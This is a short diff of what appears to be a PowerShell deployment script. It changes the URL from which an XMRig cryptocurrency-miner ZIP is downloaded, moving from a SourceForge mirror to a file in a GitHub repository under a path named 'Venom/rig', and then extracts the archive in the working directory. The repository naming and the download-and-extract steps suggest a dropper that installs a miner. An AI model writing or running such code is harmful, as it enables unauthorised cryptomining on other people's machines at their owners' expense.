@@ -68,7 +68,7 @@ cd $wd
 $currentDirectory = $PWD
 
 # Download the ZIP file
-Invoke-WebRequest -Uri "https://sourceforge.net/projects/xmrig.mirror/files/v6.22.2/xmrig-6.22.2-gcc-win64.zip/download" -OutFile "xmrig-6.22.2-gcc-win64.zip"
+Invoke-WebRequest -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig-6.22.2-gcc-win64.zip" -OutFile "xmrig-6.22.2-gcc-win64.zip"
 
 
 # Extract the ZIP file in the current directory
